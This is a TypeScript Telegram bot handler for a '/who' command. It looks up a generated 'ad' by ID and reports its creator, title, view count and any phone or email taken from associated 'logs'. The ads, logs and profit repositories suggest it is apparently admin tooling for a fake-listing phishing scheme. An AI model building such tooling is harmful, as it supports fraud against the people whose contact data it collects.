import {Context} from "@/database/models/context";
import {Composer} from "grammy";
import {adsRepository, logsRepository, profitRepository, userRepository} from "@/database";
import {getUsername} from "@/helpers/getUsername";
import moment from "moment";

const regex = /\/who\s+(?<date>\d+)/gmsi
export const composer = new Composer<Context>()
composer.hears(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.match[0])
    const date = match.groups.date

    const ad = await adsRepository.findOne({
        relations: ['author'],
        where: {
            date
        }
    })
    await ctx.deleteMessage()

    if (!ad) return ctx.reply("ad undefined",{
        reply_markup: {
            inline_keyboard: [
                [{text: "Закрыть", callback_data: "deleteThisMessage"}]
            ]
        }
    })

    const logs = await logsRepository.find({
        where: {
            ad
        }
    })

    let log = undefined
    for (const obj of logs) {
        if (obj.email) log = obj
        if (obj.sms) log = obj
    }

    let text = `
❗️ <b>Информация об объявлении</b>
🐨 <b>Завел:</b> ${await getUsername(ad.author)}

🌳 <b>ID лога:</b> <code>${ad.date}</code>
🌳 <b>Товар:</b> <code>${ad.title}</code>
🌳 <b>Просмотров:</b> <code>${ad.views}</code>${(log?.phone) ? '\n📲 SMS: ' + log?.phone : ''} ${(log?.email) ? '\n💌 EMAIL: ' + log?.email : ''}

<b>📅  Дата генерации:</b> <code>${moment(new Date(ad.created)).format('DD.MM.YYYY в hh:mm')}</code>
`

    return ctx.reply(text,{
        reply_markup: {
            inline_keyboard: [
                [{text: "Закрыть", callback_data: "deleteThisMessage"}]
            ]
        }
    })
}